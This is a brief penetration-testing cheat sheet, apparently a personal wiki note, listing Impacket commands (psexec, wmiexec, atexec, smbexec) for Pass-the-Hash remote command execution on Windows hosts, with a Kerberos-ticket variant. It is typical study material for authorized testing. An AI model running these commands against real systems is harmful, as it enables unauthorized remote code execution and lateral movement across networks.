- Impacket includes several remote command execution tools, all accept normal creds OR `-hashes :<nthash>` for Pass the Hash

```bash
impacket-psexec administrator@<ip> -hashes :<hash>
impacket-wmiexec administrator@<ip> -hashes :<hash>
impacket-atexec administrator@<ip> -hashes :<hash>      # uses scheduled tasks
impacket-smbexec administrator@<ip> -hashes :<hash>
```
- `psexec` = most common, drops+runs a service binary, gives interactive shell
- all work the same way with a Kerberos ticket instead: swap `-hashes` for `-k -no-pass` and set `KRB5CCNAME` first, see [[Pass the Ticket (Linux)]]